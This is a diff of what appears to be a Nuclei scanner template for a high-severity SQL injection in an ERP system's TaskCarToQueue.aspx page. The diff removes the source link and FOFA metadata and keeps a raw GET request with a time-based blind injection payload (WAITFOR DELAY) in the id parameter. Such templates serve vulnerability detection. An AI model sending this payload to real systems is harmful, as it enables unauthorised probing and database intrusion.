@@ -3,12 +3,8 @@ info:
   name: 商混ERP系统 TaskCarToQueue.aspx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ra5zptyzgefhr4hq'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ra5zptyzgefhr4hq
-    fofa: app="商混ERP系统"
 http:
 - raw:
   - 'GET /Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
